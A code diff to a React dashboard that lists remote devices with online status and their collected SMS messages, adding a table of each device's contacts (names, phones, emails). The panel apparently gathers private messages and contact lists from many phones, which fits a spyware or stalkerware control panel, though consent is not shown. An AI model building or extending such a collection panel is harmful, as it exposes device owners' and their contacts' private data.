@@ -58,6 +58,7 @@ export default function App() {
       ) : deviceSections.map((sec, i) => {
         const dev = sec.device || {}
         const smsList = sec.sms || []
+        const contactsList = sec.contacts || []
         const online = dev.last_seen && (Date.now() - new Date(dev.last_seen).getTime()) < 120000
         const shortId = dev.device_id ? dev.device_id.substring(0, 8) + '...' : '-'
         const isSelected = selectedDevice === dev.device_id
@@ -74,7 +75,7 @@ export default function App() {
             >
               <div>
                 <div style={styles.deviceName}>{dev.device_name || '-'} <span style={{color: online ? '#27AE60' : '#E74C3C', fontSize: 12}}>{online ? 'ONLINE' : 'OFFLINE'}</span></div>
-                <div style={styles.deviceMeta}>ID: {shortId} &middot; {dev.model || '-'} &middot; {dev.os_version || '-'} &middot; SMS: {smsList.length}</div>
+                <div style={styles.deviceMeta}>ID: {shortId} &middot; {dev.model || '-'} &middot; {dev.os_version || '-'} &middot; SMS: {smsList.length} &middot; Contacts: {contactsList.length}</div>
               </div>
               <div style={{fontSize: 11, color: '#999'}}>{dev.last_seen ? new Date(dev.last_seen).toLocaleString() : '-'}</div>
             </div>
@@ -96,6 +97,29 @@ export default function App() {
                           {smsCols.map(c => {
                             let val = sms[c]
                             if (c === 'created_at' || c === 'received_at') val = val ? new Date(val).toLocaleString() : '-'
+                            return <td key={c} style={styles.td}>{val ?? '-'}</td>
+                          })}
+                        </tr>
+                      ))}
+                    </tbody>
+                  </table>
+                )}
+                <div style={{...styles.smsHeader, marginTop: 16}}>Contacts ({contactsList.length})</div>
+                {contactsList.length === 0 ? (
+                  <div style={styles.empty}>No contacts from this device</div>
+                ) : (
+                  <table style={styles.table}>
+                    <thead>
+                      <tr>
+                        {['name', 'phone', 'email', 'created_at'].map(c => <th key={c} style={styles.th}>{c.replace(/_/g, ' ').toUpperCase()}</th>)}
+                      </tr>
+                    </thead>
+                    <tbody>
+                      {contactsList.map((ct, j) => (
+                        <tr key={ct.id || j} style={j % 2 ? styles.trAlt : {}}>
+                          {['name', 'phone', 'email', 'created_at'].map(c => {
+                            let val = ct[c]
+                            if (c === 'created_at') val = val ? new Date(val).toLocaleString() : '-'
                             return <td key={c} style={styles.td}>{val ?? '-'}</td>
                           })}
                         </tr>
